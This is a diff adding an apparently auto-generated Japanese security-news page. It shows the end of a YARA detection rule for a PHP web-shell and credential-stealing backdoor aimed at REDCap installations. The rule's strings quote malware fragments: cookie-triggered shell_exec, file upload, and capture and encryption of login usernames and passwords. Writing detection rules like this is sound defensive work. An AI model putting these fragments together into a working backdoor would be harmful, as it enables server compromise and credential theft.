+		$marker_base64 = "YjQ5ZTMzNGQtOWMwMS00NjNlLTliYzUtMDBhNjkyMGZiNjZl"
+		$s1 = "substr($cookieValue, strlen($magic_flag));"
+		$s2 = "getcwd(), php_uname(), phpversion(), $_SERVER['SERVER_SOFTWARE']"
+		$s3 = "'data' =&gt; encrypt($data, $key)"
+		$s4 = "$data = shell_exec($command);"
+		$s5 = "move_uploaded_file($tmpPath, $fileName)"
+		$s6 = "$data = implode('|', $fields)"
+		$b_s1 = "substr($cookieValue, strlen($magic_flag));" base64
+		$b_s2 = "getcwd(), php_uname(), phpversion(), $_SERVER['SERVER_SOFTWARE']" base64
+		$b_s3 = "'data' =&gt; encrypt($data, $key)" base64
+		$b_s4 = "$data = shell_exec($command);" base64
+		$b_s5 = "move_uploaded_file($tmpPath, $fileName)" base64
+		$b_s6 = "$data = implode('|', $fields)" base64
+		$t1 = "(isset($_POST['username']) &amp;&amp; $_POST['password'])"
+		$t2 = "INSERT INTO redcap_sessions (session_id, session_data, session_expiration) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))"
+		$t3 = "encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);"
+		$t4 = "redcap_connect.php"
+		$b_t1 = "(isset($_POST['username']) &amp;&amp; $_POST['password'])" base64
+		$b_t2 = "INSERT INTO redcap_sessions (session_id, session_data, session_expiration) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))" base64
+		$b_t3 = "encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);" base64
+		$b_t4 = "redcap_connect.php" base64
+		$u1 = "$zip-&gt;open($filename) === TRUE)"
+		$u2 = "$hooks_encode ="
+		$u3 = "$auth_encode ="
+		$u4 = "$file_content_hooks = $zip-&gt;getFromName($file_hooks);"
+		$u5 = "$file_content_auth = $zip-&gt;getFromName($file_auth);"
+		$u6 = "$file_content_upgrade = $zip-&gt;getFromName($file_upgrade);"
+		$u7 = "str_replace($search_content, $hooks_decode, $file_content_hooks);"
+		$u8 = "str_replace($search_content, $upgrade_decode, $file_content_upgrade);"
+		$u9 = "str_replace($search_content, $auth_decode, $file_content_auth);"
+		$b_u1 = "$zip-&gt;open($filename) === TRUE)" base64
+		$b_u2 = "$hooks_encode =" base64
+		$b_u3 = "$auth_encode =" base64
+		$b_u4 = "$file_content_hooks = $zip-&gt;getFromName($file_hooks);" base64
+		$b_u5 = "$file_content_auth = $zip-&gt;getFromName($file_auth);" base64
+		$b_u6 = "$file_content_upgrade = $zip-&gt;getFromName($file_upgrade);" base64
+		$b_u7 = "str_replace($search_content, $hooks_decode, $file_content_hooks);" base64
+		$b_u8 = "str_replace($search_content, $upgrade_decode, $file_content_upgrade);" base64
+		$b_u9 = "str_replace($search_content, $auth_decode, $file_content_auth);" base64
+		$filemarker = "&lt;?php"
+	condition:
+		filesize &lt; 1MB and $filemarker in (0 .. 128) and (((any of ($magic*) or any of ($marker*)) and (any of ($s*) or any of ($t*) or any of ($u*))) or 4 of ($s*) or 4 of ($b_s*) or all of ($t*) or all of ($b_t*) or 6 of ($u*) or 6 of ($b_u*))
+}</code></div>
+        </div>
+
+        <div class="section">
+          <h2>📌 キーワード解説</h2>
+          <div class="terms">
+            
+          </div>
+          <h3 class="subSectionTitle">深掘り解説</h3>
+          <div class="deepDive">
+            <div class="termCard deepDiveCard">
+  <div class="term">なし</div>
+
+</div>
+          </div>
+        </div>
+
+        
+
+        <div class="section">
+          <h2>🕘 生成情報</h2>
+          <div class="ruleReason">
+対象期間：2026-06-15T06:00:00+09:00 〜 2026-06-16T06:00:00+09:00
+生成時刻：2026-06-16T09:05:14.669910+09:00
+免責：本ページは自動生成です。最終判断は原文の確認を推奨します。
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      notifyhub.site
+    </div>
+  </div>
+</body>
+</html>
